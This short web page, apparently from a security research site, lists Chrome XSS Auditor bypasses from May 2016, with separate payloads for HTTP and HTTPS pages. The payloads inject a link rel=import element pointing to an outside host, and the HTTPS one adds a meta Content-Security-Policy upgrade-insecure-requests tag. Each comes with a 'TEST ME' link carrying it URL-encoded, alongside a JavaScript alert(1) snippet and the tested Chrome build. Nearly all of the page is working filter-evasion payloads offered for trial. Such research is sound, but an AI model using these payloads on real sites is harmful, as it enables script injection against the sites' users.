FROM: https://html5sec.org/xssauditor/bypasses-052016?xss=%3Clink%20rel=import%20href=https:html5sec.org/

## XSS Auditor Bypasses 05.2016
The bypasses are different for HTTP and HTTPS pages. Here, you can try both variants.

### HTTP Pages

(visit this page via HTTP) 
> ?xss=<link rel=import href=https:html5sec.org/ 

[TEST ME](https://html5sec.org/xssauditor/bypasses-052016?xss=%3Clink%20rel=import%20href=https:html5sec.org/)

### HTTPS Pages

(visit this page via HTTPS) 
> ?xss=<meta http-equiv=Content-Security-Policy content=upgrade-insecure-requests><link rel=import href=http:html5sec.org/ 

[TEST ME](https://html5sec.org/xssauditor/bypasses-052016?xss=%3Cmeta%20http-equiv=Content-Security-Policy%20content=upgrade-insecure-requests%3E%3Clink%20rel=import%20href=http:html5sec.org/)

### JS
```js
<!--
alert(1)
-->Error 404<script>alert(1)</script>
```

### Chrome Version
Google Chrome	49.0.2623.75 (Official Build) m (32-bit)
